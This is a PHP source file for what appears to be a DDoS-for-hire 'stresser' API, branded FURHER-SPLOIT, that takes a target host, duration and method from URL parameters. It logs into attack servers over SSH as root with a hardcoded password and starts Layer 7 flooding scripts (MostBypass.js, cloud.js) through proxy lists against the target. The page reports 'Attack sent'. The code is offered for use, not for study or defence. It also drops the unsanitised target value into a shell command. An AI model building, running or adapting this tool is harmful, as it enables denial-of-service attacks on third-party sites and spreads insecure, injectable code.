<?php
if (!function_exists('ssh2_connect')) //Check if API Hosting servers has ssh2 php module installed
{
        die("Install ssh2 module.\n"); 
}
if (!(isset($_GET['key']))){ //check if key was entered
  die("Enter a Key.");
}
if ($_GET['key'] == "null"){ //check if key value was entered
die("Enter a Key.");
}
 $pw = array('key1', 'key2', 'key3', 'key4', 'key5'); //Enter future API Keys here :)//////////////////API KEY GOES HERE
if (isset($_GET['key'])){ //Check if key exists and is correct
    $key = $_GET['key'];
    if (!(in_array($key, $pw))) {
    die("Key not valid.");
    }
}
 
if (isset($_GET['host'], $_GET['time'], $_GET['mode'], $_GET['method'])) { //Get all needed values to begin with
        $SERVERS1 = array(
                "localhost"     =>      array("root", "as12AS!@a") //Add servers here   format: IP "server username", "server password"
                );
                
                $random = array_rand($SERVERS1, 1);
                
        $SERVERS2 = array(
                "$random"      =>      array("root", "as12AS!@a") //Server "roatation" function chooses 1 rndm server of $Servers1
                );
        class ssh2 {
                var $connection;
                function __construct($host, $user, $pass) {
                        if (!$this->connection = ssh2_connect($host, 22)) //defaults to port 22 but you can allow ssh on diff ports too
                                throw new Exception("Error connecting to server");
                        if (!ssh2_auth_password($this->connection, $user, $pass))
                                throw new Exception("Error with login credentials");
                }
 
                function exec($cmd) {
                        if (!ssh2_exec($this->connection, $cmd))
                                throw new Exception("Error executing command: $cmd");
 
                        ssh2_exec($this->connection, 'exit');
                        unset($this->connection); //SSH2 Connection function
                }
        }
        $method = $_GET['method']; //Getting and formatting needed values
	    $mode = $_GET['mode'];
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*60) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
        $domain = $_GET['host'];
        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP))
        {
            die("Invalid Domain");
        }
        $smIP = str_replace(".", "", $ip);
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);
	    $smDomain = str_replace("https://", "", $smDomain);
	    $smDomain = str_replace("/", "", $smDomain);
	if($_GET['method'] == "BYPASS") { 
      $command = "screen -dmS {$smDomain} node MostBypass.js {$domain} {$time} proxy.txt";  //Add methods and their commands here [Example Method]
    }
        elseif($_GET['method'] == "CLOUD") { 
            $command = "screen -dmS {$smDomain} node cloud.js {$domain} {$time} proxy.txt"; 
        }
        elseif($_GET['method'] == "STOP") { 
            $command = "screen -X -s {$smDomain} quit"; 
        }
        else die();
 
        if ($method != "STOP") {
          foreach ($SERVERS1 as $server=>$credentials) { //If $SERVERS2 Is set here Rotation is on, if $SERVERS1 Rotation is off and all servers launch attack
                $disposable = new ssh2($server, $credentials[0], $credentials[1]);
              $disposable->exec($command);
		            $op = ("<div class='area8'>CONSOLE: </div></br><div class='area'>Success , Attack sent to $domain for $time Seconds!</div></br>");
 
		}
   }
       elseif ($method == "STOP") {
               foreach ($SERVERS1 as $server=>$credentials) { //Stop function killing all attacks on ALL servers of a single target
                $disposable = new ssh2($server, $credentials[0], $credentials[1]);
                $disposable->exec($command);
		            $op2 = ("<div class='area8'>CONSOLE: </div></br><div class='area'>Success , Attack sent to $domain has been stopped.</div></br>");
                            }
                            }
	 }
?>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="FURHERSPLOIT API ON TOP">
<title>API</title>
<style>
.footer {
   position: fixed;
   left: 0;
   bottom: 0;
   width: 100%;
   background-color: black;
   color: white;
   text-align: center;
}
html { 
   background-color: black; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.area8 {
  font-size: 26px;
  color: #FFD700;
  letter-spacing: 3px;
  font-weight: 600;
  text-transform: uppercase;
  text-shadow: 0px 0px 5px #FFD700, 0px 0px 7px #FFD700;
}
.area {
  font-size: 20px;
  color: #fff;
  letter-spacing: 3px;
  font-weight: 600;
  text-transform: uppercase;
  text-shadow: 0px 0px 5px #fff, 0px 0px 1px #fff;
}
body
{
    color: black;
}
body { padding: 0px; margin: 0px;}
div { padding: 0px; margin: 0px; }
body { /* Force <body> to fill screen */
    position: absolute;
    left:0;
    right:0;
    top:0;
    bottom:0;
}
.container1, .container2 {
    height:50%;
}?
.rainbow {
    text-align: center;
    text-decoration: underline;
    font-size: 55px;
    font-family: monospace;
    letter-spacing: 3px;
}
.rb {
    text-align: center;
    text-decoration: underline;
    font-size: 44px;
    font-family: monospace;
    letter-spacing: 3px;
}
.rainbow_text_animated {
    background: linear-gradient(to right, #6666ff, #0099ff , #00ff00, #ff3399, #6666ff);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    animation: rainbow_animation 6s ease-in-out infinite;
    background-size: 400% 100%;
}
 
@keyframes rainbow_animation {
    0%,100% {
        background-position: 0 0;
    }
 
    50% {
        background-position: 100% 0;
    }
}
</style>
</head>
<center>
<div style="width: auto; float: centered; height: auto; background:transparent; margin:10px">
<center><div class="area8">Attack Information</div></br></center>
<div class="area">Target: <?php echo $domain ?> </div></br>
<div class="area">Method Used: <?php echo $method ?> </div></br>
<div class="area">Mode Used: <?php echo $mode ?> </div></br>
<div class="area">Attack Time: <?php echo $time ?> </div></br>
</center>
</div>
<div style="width: auto; float: centered; height: auto; background:#transparent; margin:10px">
<center>
<?php echo $op ?>
<?php echo $op2 ?>
 
 
</center>
</div>
<div style="width: 600; float:left; height: 500px; background:transparent; margin:10px">
<center>
<div class="area8">API Information</div></br>
<div class="area">Server Rotation: Disabled </div></br>
<div class="area">ROOTS: 1 </div></br>
<div class="area">Total Concurrents: 10 </div></br>
<div class="area">API Type: Layer 7 </div></br>
<div class="area">Developer: Acker Posiden </div></br>
</center>
</div>
<div style="width: 600; float:right; height: 500px; background:#transparent; margin:10px">
<center>
<div class="area8">API Options</div></br>
<div class="area">Method: HTTP </div></br>
<div class="area">Mode: GET,POST </div></br>
<div class="area">Time: Time in Sec. </div></br>
<div class="area">Key: API KEY </div></br>
<div class="area">Host: Your Target </div></br>
</center>
</div>
</center>
<div class="footer">
  <p>&copy; FURHER-SPLOIT-INC 2022</p>
</div>
